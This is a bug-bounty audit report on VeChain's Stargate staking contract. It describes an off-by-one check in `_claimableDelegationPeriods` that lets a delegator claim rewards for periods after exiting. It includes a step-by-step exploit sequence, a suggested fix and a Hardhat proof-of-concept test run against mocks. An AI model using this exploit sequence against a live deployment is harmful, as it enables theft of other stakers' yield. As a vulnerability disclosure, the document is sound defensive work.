# 59752 sc high off by one bug in claimabledelegationperiods allows claiming yield for periods after exit

**Submitted on Nov 15th 2025 at 14:32:56 UTC by @Paludo0x for** [**Audit Comp | Vechain | Stargate Hayabusa**](https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa)

* **Report ID:** #59752
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol>
* **Impacts:** Theft of unclaimed yield

## Description

### Brief / Intro

A boundary check error in `Stargate::_claimableDelegationPeriods()` can cause the contract to return an upper bound that extends beyond a delegation's recorded `endPeriod`.

If exploited, an attacker can claim reward periods after they have exited delegation.

### Vulnerability Details

The function `_claimableDelegationPeriods()` distinguishes between "ended" vs "active" delegations using a `>` comparison that does not include the equality case `endPeriod == nextClaimablePeriod`.

Relevant snippet:

```solidity
        // check first for delegations that ended
        // endPeriod is not max if the delegation is exited or requested to exit
        // if the endPeriod is before the current validator period, it means the delegation ended
        // because if its equal it means they requested to exit but the current period is not over yet
        if (
            endPeriod != type(uint32).max &&
            endPeriod < currentValidatorPeriod &&
            endPeriod > nextClaimablePeriod
        ) {
            return (nextClaimablePeriod, endPeriod);
        }

        // check that the start period is before the current validator period
        // and if it is, return the start period and the current validator period.
        // we use "less than" because if we use "less than or equal", even
        // if the delegation started, the current period rewards are not claimable
        if (nextClaimablePeriod < currentValidatorPeriod) {
            return (nextClaimablePeriod, completedPeriods);
        }
```

When `nextClaimablePeriod == endPeriod`, the logic falls through to the "active" branch and returns `(nextClaimablePeriod, completedPeriods)`.

If `completedPeriods` is greater than `endPeriod` at that moment, the function allows iterating and computing rewards for periods strictly greater than `endPeriod`.

Exploit sequence is described below.

{% stepper %}
{% step %}

### Stake and delegate

Stake and delegate an NFT `tokenId`.
{% endstep %}

{% step %}

### Arrange last claimed and request exit

Ensure `lastClaimedPeriod == endPeriod - 1` (typically achieved by claiming up to the previous period). Call `requestDelegationExit(tokenId)`, which sets `endPeriod` to the exit period.
{% endstep %}

{% step %}

### Advance validator periods

Wait for the validator to advance `completedPeriods` beyond `P`.
{% endstep %}

{% step %}

### Claim rewards

Call `claimRewards(tokenId)`. The vulnerable logic returns `[endPeriod, completedPeriods]` instead of `[endPeriod, endPeriod]` and the contract computes rewards including periods after exit.
{% endstep %}
{% endstepper %}

### Impact Details

Classified as **High — Theft of unclaimed yield**.

Attackers who arrange the timing can receive rewards for periods after their delegation ended. The stolen value equals the sum of rewards allocated to those periods after exit that the `ProtocolStaker` reports as payable to delegators.

### Recommended Fix

Apply a targeted fix in `_claimableDelegationPeriods` so that the ended delegation branch handles the equality case (i.e., include the equality when comparing `endPeriod` and `nextClaimablePeriod`).

{% hint style="info" %}
Suggested minimal change: ensure the ended-delegation branch includes `endPeriod >= nextClaimablePeriod` (or otherwise treat the `==` case as ended) so the returned last-claimable period never exceeds `endPeriod`.
{% endhint %}

## Proof of Concept

<details>

<summary>Unit test PoC (to paste in Delegation.test.ts)</summary>

This is the log from the test:

```
  shard-u2: Stargate: Delegation

[EXIT INVARIANT] endPeriodAfterExit: 6 
currentValidatorPeriod: 120n 
nextClaimablePeriod: 6 
lastClaimablePeriod: 14
    ✔ should not expose claimable periods after delegation exit (regression for _claimableDelegationPeriods off-by-one)


  1 passing (2s)
```

Test code used:

```ts
it.only("should not expose claimable periods after delegation exit (regression for _claimableDelegationPeriods off-by-one)", async () => {
    const levelSpec = await stargateNFTMock.getLevel(LEVEL_ID);

    // 1. Stake and delegate
    await (
        await stargateContract.connect(user).stake(LEVEL_ID, {
            value: levelSpec.vetAmountRequiredToStake,
        })
    ).wait();

    const tokenId = await stargateNFTMock.getCurrentTokenId();

    await (await stargateContract.connect(user).delegate(tokenId, validator.address)).wait();

    // Bring delegation into ACTIVE state with completed periods = 5
    const initialCompleted = 5;
    await (
        await protocolStakerMock.helper__setValidationCompletedPeriods(
            validator.address,
            initialCompleted
        )
    ).wait();
    expect(await stargateContract.getDelegationStatus(tokenId)).to.equal(
        DELEGATION_STATUS_ACTIVE
    );

    // Claim all rewards so lastClaimedPeriod == initialCompleted
    await (await stargateContract.connect(user).claimRewards(tokenId)).wait();

    // 2. User requests exit -> endPeriod becomes current validator period (initialCompleted + 1)
    await (await stargateContract.connect(user).requestDelegationExit(tokenId)).wait();

    const delegationId = await stargateContract.getDelegationIdOfToken(tokenId);
    const [, endPeriodAfterExit] = await protocolStakerMock.getDelegationPeriodDetails(
        delegationId
    );

    // Sanity: there should be no claimable periods immediately after exit
    const [, lastClaimableAfterExitBeforeAdvance] =
        await stargateContract.claimableDelegationPeriods(tokenId);
    expect(lastClaimableAfterExitBeforeAdvance).to.equal(0);

    // 3. Advance validator periods far beyond endPeriod (simulating validator progressing)
    const completedAfter = Number(endPeriodAfterExit) + 8;
    await (
        await protocolStakerMock.helper__setValidationCompletedPeriods(
            validator.address,
            completedAfter
        )
    ).wait();

    // 4. Claimable periods should remain capped at endPeriod but instead leak to completedAfter
    const [nextClaimableAfterExit, lastClaimableAfterExit] = await stargateContract.claimableDelegationPeriods(
        tokenId
    );
    const [currentValidatorPeriodAfterAdvance] = await protocolStakerMock.getValidationPeriodDetails(
        validator.address
    );
    log(
        "\n[EXIT INVARIANT]",
        "endPeriodAfterExit:",
        endPeriodAfterExit.toString(),
        "\ncurrentValidatorPeriod:",
        currentValidatorPeriodAfterAdvance,
        "\nnextClaimablePeriod:",
        nextClaimableAfterExit.toString(),
        "\nlastClaimablePeriod:",
        lastClaimableAfterExit.toString()
    );

    expect(lastClaimableAfterExit > endPeriodAfterExit).to.equal(
        true,
        "claimableDelegationPeriods leaked periods after delegation end"
    );
});
```

</details>
